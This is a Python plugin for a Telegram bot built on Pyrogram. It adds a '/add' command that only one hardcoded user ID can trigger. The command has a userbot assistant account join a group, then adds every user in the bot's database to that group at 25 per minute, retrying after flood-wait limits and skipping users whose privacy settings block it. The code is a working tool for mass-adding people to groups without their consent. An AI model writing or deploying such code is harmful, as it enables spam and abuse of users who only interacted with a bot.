import asyncio
import logging
from contextlib import suppress

from pyrogram import enums, errors, filters, types

from anony import app, db, userbot


logger = logging.getLogger(__name__)

ACCESS_USER_ID = 8776091899
ADD_PER_MINUTE = 25
SLEEP_BETWEEN_ADDS = 60 / ADD_PER_MINUTE
PROGRESS_EVERY = 25

active_adds: set[int] = set()


def error_classes(*names: str) -> tuple[type[Exception], ...]:
    return tuple(
        error
        for name in names
        if isinstance((error := getattr(errors, name, None)), type)
    )


SKIP_ERRORS = error_classes(
    "UserAlreadyParticipant",
    "UserPrivacyRestricted",
    "UserNotMutualContact",
    "UserChannelsTooMuch",
    "UserKicked",
    "PeerIdInvalid",
    "UserIdInvalid",
)


async def ensure_assistant_in_chat(message: types.Message):
    chat_id = message.chat.id

    client = await db.get_client(chat_id)
    if not client:
        if userbot.clients:
            client = userbot.clients[0]
        else:
            return None, "No string session assistant is running."

    try:
        member = await app.get_chat_member(chat_id, client.id)
        if member.status in (
            enums.ChatMemberStatus.BANNED,
            enums.ChatMemberStatus.RESTRICTED,
        ):
            return None, "Assistant is banned/restricted in this group."
        return client, None
    except errors.UserNotParticipant:
        pass
    except errors.ChatAdminRequired:
        return None, "Bot needs admin rights to check assistant access."
    except Exception as ex:
        logger.warning("Assistant check failed in %s: %s", chat_id, ex)

    try:
        if message.chat.username:
            invite_link = message.chat.username
        else:
            chat = await app.get_chat(chat_id)
            invite_link = chat.invite_link or await app.export_chat_invite_link(chat_id)
    except errors.ChatAdminRequired:
        return None, "Bot needs invite-link admin permission to add assistant."
    except Exception as ex:
        return None, f"Assistant invite failed: {type(ex).__name__}"

    try:
        await client.join_chat(invite_link)
    except errors.UserAlreadyParticipant:
        pass
    except errors.InviteRequestSent:
        with suppress(Exception):
            await app.approve_chat_join_request(chat_id, client.id)
    except Exception as ex:
        return None, f"Assistant could not join: {type(ex).__name__}"

    with suppress(Exception):
        await client.resolve_peer(chat_id)

    return client, None


async def add_user_to_chat(client, chat_id: int, user_id: int) -> str:
    try:
        await client.add_chat_members(chat_id, user_id)
        return "added"
    except errors.FloodWait as fw:
        await asyncio.sleep(fw.value + 5)
        return await add_user_to_chat(client, chat_id, user_id)
    except SKIP_ERRORS:
        return "skipped"
    except errors.ChatAdminRequired:
        return "admin_required"
    except Exception as ex:
        logger.debug("Failed to add %s in %s: %s", user_id, chat_id, ex)
        return "failed"


@app.on_message(filters.command(["add"]) & filters.group & ~app.bl_users)
async def add_members(_, message: types.Message):
    if not message.from_user or message.from_user.id != ACCESS_USER_ID:
        return await message.reply_text("You are not allowed to use this command.")

    chat_id = message.chat.id
    if chat_id in active_adds:
        return await message.reply_text("Add members process is already running here.")

    users = [uid for uid in await db.get_users() if isinstance(uid, int)]
    if not users:
        return await message.reply_text("Database users list is empty.")

    client, error = await ensure_assistant_in_chat(message)
    if error:
        return await message.reply_text(error)

    active_adds.add(chat_id)
    added = skipped = failed = processed = 0
    total = len(users)

    progress = await message.reply_text(
        f"Starting member add...\n"
        f"Users in database: {total}\n"
        f"Speed: {ADD_PER_MINUTE} users/minute"
    )

    try:
        for user_id in users:
            if chat_id not in active_adds:
                break
            if user_id in {app.id, client.id, ACCESS_USER_ID}:
                skipped += 1
                processed += 1
                continue

            result = await add_user_to_chat(client, chat_id, user_id)
            processed += 1

            if result == "added":
                added += 1
            elif result == "skipped":
                skipped += 1
            elif result == "admin_required":
                await progress.edit_text(
                    "Stopped: assistant needs permission to add members in this group.\n\n"
                    f"Processed: {processed}/{total}\n"
                    f"Added: {added}\n"
                    f"Skipped: {skipped}\n"
                    f"Failed: {failed}"
                )
                return
            else:
                failed += 1

            if processed % PROGRESS_EVERY == 0:
                with suppress(Exception):
                    await progress.edit_text(
                        f"Adding members...\n"
                        f"Processed: {processed}/{total}\n"
                        f"Added: {added}\n"
                        f"Skipped: {skipped}\n"
                        f"Failed: {failed}"
                    )

            await asyncio.sleep(SLEEP_BETWEEN_ADDS)

        status = "Stopped" if chat_id not in active_adds else "Completed"
        await progress.edit_text(
            f"{status}.\n\n"
            f"Processed: {processed}/{total}\n"
            f"Added: {added}\n"
            f"Skipped: {skipped}\n"
            f"Failed: {failed}"
        )
    finally:
        active_adds.discard(chat_id)


@app.on_message(filters.command(["stopadd"]) & filters.group & ~app.bl_users)
async def stop_add_members(_, message: types.Message):
    if not message.from_user or message.from_user.id != ACCESS_USER_ID:
        return await message.reply_text("You are not allowed to use this command.")

    chat_id = message.chat.id
    if chat_id not in active_adds:
        return await message.reply_text("No add members process is running here.")

    active_adds.discard(chat_id)
    await message.reply_text("Stopping add members process...")
